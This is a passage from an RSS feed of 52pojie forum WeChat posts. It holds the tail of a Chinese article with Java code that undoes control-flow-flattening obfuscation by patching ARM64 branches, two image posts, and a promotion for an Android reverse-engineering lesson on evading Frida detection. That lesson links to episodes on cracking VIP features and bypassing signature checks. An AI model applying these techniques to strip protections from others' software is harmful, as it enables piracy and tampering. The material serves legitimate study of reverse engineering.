insBetweenKeyInsAndEnd.get(insBetweenKeyInsAndEnd.size() - <span style="color: rgb(255, 115, 253);">1</span>);<br />        String[] insInfoList = keyIns.toString().split(<span style="color: rgb(168, 255, 96);">","</span>);<br />        <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">cond</span> = insInfoList[insInfoList.length - <span style="color: rgb(255, 115, 253);">1</span>].trim();        patchInfo.put(copyBlock.getOrDefault(willPatchCondInstruction.getAddress(), willPatchCondInstruction.getAddress()) - moduleBase,<br />                      String.format(<span style="color: rgb(168, 255, 96);">"b.%s %d"</span>, cond, trueAddress - moduleBase));<br />        <span style="color: rgb(146, 255, 184);">// 创建一个临时的list，因为跳转指令不参与重排</span><br />        List&lt;Instruction&gt; tmp = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayList</span>&lt;&gt;();<br />        <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">i</span> = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; insBetweenKeyInsAndEnd.size(); i++)<br />            <span style="color: rgb(150, 203, 254);">if</span> (!insBetweenKeyInsAndEnd.get(i).getMnemonic().equals(<span style="color: rgb(168, 255, 96);">"b"</span>))                tmp.add(insBetweenKeyInsAndEnd.get(i));<br />        <span style="color: rgb(146, 255, 184);">// 从1开始，1 patch 0的，2 patch 1的</span><br />        <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">i</span> = <span style="color: rgb(255, 115, 253);">1</span>; i &lt; tmp.size(); i++) {<br />            patchInfo.put(copyBlock.getOrDefault(tmp.get(i).getAddress(), tmp.get(i).getAddress()) - moduleBase, tmp.get(i - <span style="color: rgb(255, 115, 253);">1</span>).toString());        }    }<br />}</code></pre><h3>7.3 allocBlock</h3><p>这里是最简单的一个分配：如果说某一个控制块有足够的 size，而且 patchInfo, copyBlock 中都没出现过这个 block（代表它没有被分配过），那么就可以使用这块区域，将当前区域的首条指令返回即可，由外部进行 patch</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">private</span> Instruction <span style="color: rgb(255, 255, 182);">allocBlock</span>(List&lt;Instruction&gt; common, <span style="color: rgb(255, 255, 182);">int</span> size, Map&lt;Long, String&gt; patchInfo, Map&lt;Long, Long&gt; copyBlock) {<br />    <span style="color: rgb(150, 203, 254);">for</span> (List&lt;Instruction&gt; controlNode : controlNodes) {<br />        <span style="color: rgb(146, 255, 184);">// 这里需要避免entry之后的控制块被分配了，因为它可能是接着的，是没有跳转指令来覆盖的</span><br />        <span style="color: rgb(146, 255, 184);">// 这个控制块一般是preDispatcher的后继</span><br />        List&lt;Instruction&gt; from = fromMap.get(controlNode.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress());<br />        <span style="color: rgb(255, 255, 182);">boolean</span> <span style="color: rgb(198, 197, 254);">isLinkEntry</span> = <span style="color: rgb(198, 197, 254);">false</span>;<br />        <span style="color: rgb(150, 203, 254);">for</span> (Instruction f : from)<br />            <span style="color: rgb(150, 203, 254);">if</span> (f.getAddress() == preDispather.get(preDispather.size() - <span style="color: rgb(255, 115, 253);">1</span>).getAddress())<br />                isLinkEntry = <span style="color: rgb(198, 197, 254);">true</span>;<br />        <span style="color: rgb(150, 203, 254);">if</span> (isLinkEntry)<br />            <span style="color: rgb(150, 203, 254);">continue</span>;<br />        <span style="color: rgb(150, 203, 254);">if</span> (controlNode.size() &gt;= size &amp;&amp; !patchInfo.containsKey(controlNode.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress() - moduleBase) &amp;&amp; !copyBlock.containsValue(controlNode.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress())) {<br />            <span style="color: rgb(150, 203, 254);">return</span> controlNode.get(<span style="color: rgb(255, 115, 253);">0</span>);        }    }<br />}</code></pre><p>如果 patch 只是这样的话，可以略过，但是真正处理时，出现 size 比较大的情况，所以后面还需继续处理，需要多个控制块才能复制这个 common</p><p>倒着分配比较好处理，比如 commonBlock 需要复制为 block1, block2, block3，那么倒着分配的话，可以分配 block2 时，将它的末尾 patch 为 <code style="font-family: SFMono-Regular, Consolas, ;">b {block3Addr}</code></p><p>一直分配，直到rest为0</p><ul><li style="margin-left: 2px;"><p>每次分配实际能用的是 controlNode.size - 1，因为需要 patch 跳转到下个分配块的指令</p></li><li style="margin-left: 2px;"><p>分配完成之后，需要将 controlNode 的首个指令映射到 commonBlock 中，将信息存放在 copyBlock 里面</p></li></ul><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">private</span> Instruction <span style="color: rgb(255, 255, 182);">allocBlock</span>(List&lt;Instruction&gt; common, <span style="color: rgb(255, 255, 182);">int</span> size, Map&lt;Long, String&gt; patchInfo, Map&lt;Long, Long&gt; copyBlock) {<br />    <span style="color: rgb(146, 255, 184);">// ...</span><br />    <span style="color: rgb(146, 255, 184);">// 倒着分配</span><br />    <span style="color: rgb(255, 255, 182);">Instruction</span> <span style="color: rgb(198, 197, 254);">lastAlloc</span> = <span style="color: rgb(198, 197, 254);">null</span>;<br />    <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">rest</span> = size;<br />    <span style="color: rgb(146, 255, 184);">// 对于没有一个区块能满足的</span><br />    <span style="color: rgb(150, 203, 254);">for</span> (List&lt;Instruction&gt; controlNode : controlNodes) {<br />        <span style="color: rgb(146, 255, 184);">// 这里需要避免entry之后的控制块被分配了，因为它可能是接着的，是没有跳转指令来覆盖的</span><br />        <span style="color: rgb(146, 255, 184);">// 这个控制块一般是preDispatcher的后继</span><br />        List&lt;Instruction&gt; from = fromMap.get(controlNode.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress());<br />        <span style="color: rgb(255, 255, 182);">boolean</span> <span style="color: rgb(198, 197, 254);">isLinkEntry</span> = <span style="color: rgb(198, 197, 254);">false</span>;<br />        <span style="color: rgb(150, 203, 254);">for</span> (Instruction f : from)<br />            <span style="color: rgb(150, 203, 254);">if</span> (f.getAddress() == preDispather.get(preDispather.size() - <span style="color: rgb(255, 115, 253);">1</span>).getAddress())<br />                isLinkEntry = <span style="color: rgb(198, 197, 254);">true</span>;<br />        <span style="color: rgb(150, 203, 254);">if</span> (isLinkEntry)<br />            <span style="color: rgb(150, 203, 254);">continue</span>;<br />        <span style="color: rgb(146, 255, 184);">// size - common.size() 是common块之外的，会有点对不起来，所以得手动处理</span><br />        <span style="color: rgb(146, 255, 184);">// 理论上只有第一次分配，即分配尾部需注意，这里直接全做判断，简单一些</span><br />        <span style="color: rgb(150, 203, 254);">if</span> (controlNode.size() &gt; <span style="color: rgb(255, 115, 253);">1</span> + (size - common.size()) &amp;&amp; !patchInfo.containsKey(controlNode.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress() - moduleBase) &amp;&amp; !copyBlock.containsValue(controlNode.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress())) {<br />            <span style="color: rgb(146, 255, 184);">//                return controlNode.get(0);</span><br />            <span style="color: rgb(150, 203, 254);">if</span> (lastAlloc != <span style="color: rgb(198, 197, 254);">null</span>) {<br />                patchInfo.put(controlNode.get(Math.min(controlNode.size() - <span style="color: rgb(255, 115, 253);">1</span>, rest + <span style="color: rgb(255, 115, 253);">1</span>)).getAddress() - moduleBase, String.format(<span style="color: rgb(168, 255, 96);">"b %d"</span>, lastAlloc.getAddress() - moduleBase));            }<br />            lastAlloc = controlNode.get(<span style="color: rgb(255, 115, 253);">0</span>);<br />            <span style="color: rgb(146, 255, 184);">// 不同区块之间需要一个br指令去跳转下一个alloc区域</span><br />            rest = rest - (controlNode.size() - <span style="color: rgb(255, 115, 253);">1</span>);<br />            <span style="color: rgb(150, 203, 254);">if</span> (rest &lt;= <span style="color: rgb(255, 115, 253);">0</span>) {<br />                <span style="color: rgb(150, 203, 254);">return</span> lastAlloc;<br />            } <span style="color: rgb(150, 203, 254);">else</span><br />                copyBlock.put(common.get(rest + <span style="color: rgb(255, 115, 253);">1</span>).getAddress(), controlNode.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress());        }    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (rest &gt; <span style="color: rgb(255, 115, 253);">0</span>)<br />        <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RunTimeExecption</span>(<span style="color: rgb(168, 255, 96);">"No enough control block"</span>);<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />}</code></pre><p>到此为止，反混淆的实现已经完成，它还不是很完美，但是反混淆的结果还是很令我满意的</p><p>本文完成之后并未进行细致的检查，而且也不是十分细致，因为写一遍已经耗费我数个小时了，暂时先这样，后续可能再做修正。如果任何问题，欢迎评论</p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1937641-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Tue, 25 Jun 2024 17:36:28 +0800</pubDate>
</item>
<item>
<title>（图作者 | @Aoemax）</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140717&amp;idx=1&amp;sn=f1a947226a29eb845bbd1fdc054438f5&amp;chksm=bd50a2398a272b2fde11dd028e91bedf6ba4309b533b5ae9b99d00d75ceb958e7196cc6fe011&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140717&amp;idx=1&amp;sn=f1a947226a29eb845bbd1fdc054438f5&amp;chksm=bd50a2398a272b2fde11dd028e91bedf6ba4309b533b5ae9b99d00d75ceb958e7196cc6fe011&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
<span>吾爱pojie</span> <span>2024-06-10 09:04</span> <span style="display: inline-block;">江苏</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=59b7a2a3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZK6FZwziaWeJOB25hib7tyTpo8c7iaunnqflPYM2gFFmvZsSRatpYYsrhw7UMIJnjrGlGjJibejhPTGUQ%2F0%3Fwx_fmt%3Djpeg" />
</p>

<div class="image_content " id="js_image_content"> <!----> <!----> <!----> <div class="wx_album_area js_album_wrap "></div> <div class="rich_media_tool "><div class="rich_media_info weui-flex policy_tips js_ad_policy_tips tips_global_primary "><!----></div></div> </div>

<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_jpg/LFPriaSjBUZK6FZwziaWeJOB25hib7tyTpov103HibjlEBrUFgZicxyicjncsvKk6Libjicvv1pvD25jicJWAT3FrI2d3Kg/0?wx_fmt=jpeg" /></p>
]]></content:encoded>
<pubDate>Sun, 09 Jun 2024 21:21:39 +0800</pubDate>
</item>
<item>
<title>（图作者 | @Aoemax）</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140711&amp;idx=1&amp;sn=0c176fbf626b6f67721bf20976176398&amp;chksm=bd50a2338a272b25055d8757ef8321a08edf953463cfe26554428a4ea16c61d6213297b404ab&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140711&amp;idx=1&amp;sn=0c176fbf626b6f67721bf20976176398&amp;chksm=bd50a2338a272b25055d8757ef8321a08edf953463cfe26554428a4ea16c61d6213297b404ab&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
<span>吾爱pojie</span> <span>2024-06-06 14:27</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=10633252&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZK6FZwziaWeJOB25hib7tyTpom585ApCF3IsBBhuFicTiaA9DB68lGbxFDafkib7uh4uibTuKsq5nAfjibYw%2F0%3Fwx_fmt%3Djpeg" />
</p>

<div class="image_content " id="js_image_content"> <!----> <!----> <!----> <div class="wx_album_area js_album_wrap "></div> <div class="rich_media_tool "><div class="rich_media_info weui-flex policy_tips js_ad_policy_tips tips_global_primary "><!----></div></div> </div>

<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_jpg/LFPriaSjBUZK6FZwziaWeJOB25hib7tyTpoRy1aleDOO3J7JVF2FavxShyNNLbIw2ZVDp6ZExTMhyrMU9uOKhRgwA/0?wx_fmt=jpeg" /></p>
]]></content:encoded>
<pubDate>Thu, 06 Jun 2024 14:27:19 +0800</pubDate>
</item>
<item>
<title>吾爱破解安卓逆向入门教程《安卓逆向这档事》十八、表哥，你也不想你的Frida被检测吧!(上)</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140642&amp;idx=1&amp;sn=cf8328f89aff48e3c338fee43e3a5d43&amp;chksm=bd50a2768a272b60ea07cc97059a54accace2b6e99ed2ac50d1e10ffc2370eae73f2c32e65d9&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140642&amp;idx=1&amp;sn=cf8328f89aff48e3c338fee43e3a5d43&amp;chksm=bd50a2768a272b60ea07cc97059a54accace2b6e99ed2ac50d1e10ffc2370eae73f2c32e65d9&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-05-08 18:00</span> <span style="display: inline-block;">北京</span>
</p>

<p>由吾爱破解论坛移动安全区版主 正己录制的吾爱破解安卓逆向 0基础 新手小白 视频教程《安卓逆向这档事》正式上线啦，如果你想学习安卓逆向，这是一个不错的机会呦！</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=a70bea5c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZK4icYAdadYS3TicaAP02HZlh4wanqY350xys8nlGGa85T2F1uTcMNKdUAeVBfjgv7Pal5m4e5HIK0Q%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p><span style="font-size: 24px;"><strong style="letter-spacing: 0.544px; text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; text-align: start; font-size: 20px;"><span>坛账号：正己</span></strong></span></p><p><br /></p><p><span style="background-color: rgb(255, 251, 0);">这是面向 <strong>0基础</strong> <strong>新手入门</strong> 的<strong>视频动画教程</strong>，后面一大段文字只是视频讲解课件，直接拉到<strong>底部点击“</strong><strong>阅读原文”</strong><strong>观看视频</strong>，手把手教学，入门建议从第一课学起，持续更新中。</span></p><p><span>由吾爱破解论坛移动安全区版主 正己录制的吾爱破解安卓逆向</span><span style="color: rgb(255, 0, 0);"><strong><span> 0基础 新手小白 视频教程</span></strong></span><span>《安卓逆向这档事》正式上线啦，如果你想学习安卓逆向，这是一个不错的机会呦！</span></p><p><span>前情提要：<a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140106&amp;idx=1&amp;sn=47a4d985cc32e332e1e039fc810896de&amp;chksm=bd50a05e8a272948a2fc4af36269aeb24616aec58c3391d960ad4b6d37709bcdf1b5242891af&amp;scene=21#wechat_redirect" target="_blank">吾爱破解安卓逆向入门教程《安卓逆向这档事》番外实战篇2-【2024春节】解题领红包活动，启动!</a></span></p><p><br /></p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=6920e954&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZK4icYAdadYS3TicaAP02HZlhHumTbrbuChf6TFj0V4lYtFAkVk3U5J2tNhiaOmYNAFib9w8X1icBfvo1w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>1.了解常见frida检测</p><p>1.教程Demo(更新)2.jadx-gui3.VS Code<br />4.jeb</p><h2>略。。。过程太长见论坛远程，看视频教程就行。</h2><p><span>百度云：</span></p><p><span style="font-size: 15px;">https://pan.baidu.com/s/1cFWTLn14jeWfpXxlx3syYw?pwd=nqu9</span></p><p><span style="font-size: 15px;">阿里云PS：</span></p><p><span style="font-size: 15px;">https://www.aliyundrive.com/s/TJoKMK6du6x</span></p><p><span style="font-size: 15px;">哔哩哔哩：</span></p><p><span style="font-size: 15px;">https://www.bilibili.com/video/BV1X24y1m7cj</span></p><p><span style="font-size: 15px;">教程开源地址：</span></p><p><span style="font-size: 15px;">https://github.com/ZJ595/AndroidReverse</span></p><p><span style="font-size: 15px;"><br /></span></p><p><span>PS:解压密码都是52pj，阿里云由于不能分享压缩包，所以下载exe文件，双击自解压</span></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138475&amp;idx=1&amp;sn=e3c5242b7c51f022fcc0efb7f626ab61&amp;chksm=bd50b9ff8a2730e9484df2faa08ed63c1980d5f230b69200450917b0daae1904505c878daca8&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》一、模拟器环境搭建</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138483&amp;idx=1&amp;sn=efa7eabbf0b0cc637a0ccdf8dd62abe5&amp;chksm=bd50b9e78a2730f1f994976f36a60dd8390c4920396b8aec2052b4a666d91d18555096fc8172&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》二、初识APK文件结构、双开、汉化、基础修改</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138541&amp;idx=1&amp;sn=c7482f59c3d830b2646e276761928941&amp;chksm=bd50b9b98a2730af72e1f9e346663c12973821967c1ac002f5fcdabd0182af5f6106b36d6a01&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》三、初识smail，vip终结者</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138554&amp;idx=1&amp;sn=be2fe7ffb0520ef17405a754ff0725c8&amp;chksm=bd50b9ae8a2730b84d054c7bd903f8a066251266e16cb1438999759797383e6f20aa656fbbff&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》四、恭喜你获得广告&amp;弹窗静默卡</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138674&amp;idx=1&amp;sn=17a3271b1771bdacf3392fb64dcc5dc3&amp;chksm=bd50ba268a273330bea4fd1804afff15b9308ed53c88d9aa26a363da0bdeff63642fcce3a42b&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》五、1000-7=？&amp;动态调试&amp;Log插桩</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138693&amp;idx=1&amp;sn=a09896ce9c1aa5e7194600ff7ca011e9&amp;chksm=bd50bad18a2733c7c536438f5181eb3d73a57c0349e010fda23d7973cb0ebf272f15b82be56a&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》六、校验的N次方-签名校验对抗、PM代{过}{滤}理、IO重定向</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138779&amp;idx=1&amp;sn=7201ed7aca4cdd6954787022c7f26b81&amp;chksm=bd50ba8f8a2733998f65348060f3f6202bea1bba2f61d27e259ecf5521425ccdfcbb93510d06&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》七、Sorry，会Hook真的可以为所欲为-Xposed快速上手(上)模块编写,常用Api</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138987&amp;idx=1&amp;sn=c36c67b952a02f676fcdd5fb5c42abbc&amp;chksm=bd50bbff8a2732e9c5b256ec89ab50fe1df5158dfbcd4592f4440f564dec4d31e20387e0175b&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》八、Sorry，会Hook真的可以为所欲为-xposed快速上手(下)快速hook</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139179&amp;idx=1&amp;sn=26e374dfb5776d41a7d3501770915a77&amp;chksm=bd50bc3f8a2735293c12856cfabf63aa694a2c66b8846a83eb9e301ac60d31484ed1600b8e1c&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》九、密码学基础、算法自吐、非标准加密对抗</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139564&amp;idx=1&amp;sn=ed1a626174cd39572544fa54e320e135&amp;chksm=bd50bdb88a2734ae34b4d4bad5de061a368863cab0ac1e51c5969c926a6ebab29fbe5f729cbf&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十、不是我说，有了IDA还要什么女朋友？</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139620&amp;idx=1&amp;sn=d65e23f4c8a5bc6cf94637af05025cea&amp;chksm=bd50be708a273766f5f00b91d3df8921283fecb3b2b54432bdee2b2b3330b5ea76c68f857bc9&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十二、大佬帮我分析一下</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139664&amp;idx=1&amp;sn=8f76acd55355f1000afc0c85e35212b0&amp;chksm=bd50be048a2737124982c5985c5a5b2393fafcf77a30f43adb9072719092167c35f738afccce&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》番外实战篇1-某电影视全家桶</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139714&amp;idx=1&amp;sn=28cc2ca160f7168a5ac43f658c5b57cd&amp;chksm=bd50bed68a2737c0ed9ff5513b2cf6aa5bcc6176f28b14f47bf8d32485b1d557bbc5f14f65bc&amp;scene=21#wechat_redirect" target="_blank"><span style="color: rgb(68, 68, 68);">《安卓逆向这档事》十三、是时候学习一下Frida一把梭了(上)</span></a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139750&amp;idx=1&amp;sn=17a282c1f0e2c56e7d8321867bc2685e&amp;chksm=bd50bef28a2737e4dae8032de4d19cf8e226a00801419c34b837b02074e10f84fe1c1aec4130&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十四、是时候学习一下Frida一把梭了(中)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139756&amp;idx=1&amp;sn=6c91893c01ccde3637ee64551ad67884&amp;chksm=bd50bef88a2737ee2eb88ce9c760937d701be06858c3dfec10af97f70b2ef847ebcf2b66e56f&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十五、是时候学习一下Frida一把梭了(下)</a></p><p><span style="color: rgb(87, 107, 149);"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139867&amp;idx=1&amp;sn=cf9c990403c548b8495b3dde935a4644&amp;chksm=bd50bf4f8a273659ea78e3d7c191cdab463b4bc469f63fd5749028dba0fbf79fd796d74308fc&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十六、是时候学习一下Frida一把梭了(终)</a></span></p><p><span style="color: rgb(87, 107, 149);"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140090&amp;idx=1&amp;sn=d8b3011c016ae650d83db7bd9363878c&amp;chksm=bd50bfae8a2736b8260a8115ae2b0b95c929c8b221cabd8733853f6ba5409180b6a1443b30c0&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十七、你的RPCvs佬的RPC</a></span></p><p><span style="color: rgb(87, 107, 149);"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140106&amp;idx=1&amp;sn=47a4d985cc32e332e1e039fc810896de&amp;chksm=bd50a05e8a272948a2fc4af36269aeb24616aec58c3391d960ad4b6d37709bcdf1b5242891af&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》番外实战篇2-【2024春节】解题领红包活动，启动!</a><br /></span><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139756&amp;idx=1&amp;sn=6c91893c01ccde3637ee64551ad67884&amp;chksm=bd50bef88a2737ee2eb88ce9c760937d701be06858c3dfec10af97f70b2ef847ebcf2b66e56f&amp;scene=21#wechat_redirect" style="color: rgb(68, 68, 68); cursor: pointer;" target="_blank"></a><br /></p><p>frida常用检测点及其原理--一把梭方案frida 检测从inlinehook角度检测fridaFrida检测手段探究Lsposed 技术原理探讨 &amp;&amp; 基本安装使用strongR-frida-android[原创]绕过bilibili frida反调试基础反检测 frida-server关于frida检测的一个新思路读取本地so文件的符号的偏移<br />多种姿势花样使用Frida注入</p><p><span>详细文字介绍、视频原件下载、视频所用到的程序下载、课后作业和学习交流参看论坛原文：</span></p><p><span>https://www.52pojie.cn/thread-1921073-1-1.html</span></p><p><span><br /></span></p><p><span style="font-size: 24px;"><span style="color: rgb(255, 0, 0);">点击左下角“阅读原文”，</span><strong><span style="color: rgb(255, 0, 0);">进入 <em>B站 </em>在</span></strong></span><span style="color: rgb(255, 0, 0); font-size: 24px;"><strong>线观看视频教程，</strong>欢迎一键三连转发</span><span style="font-size: 24px; color: 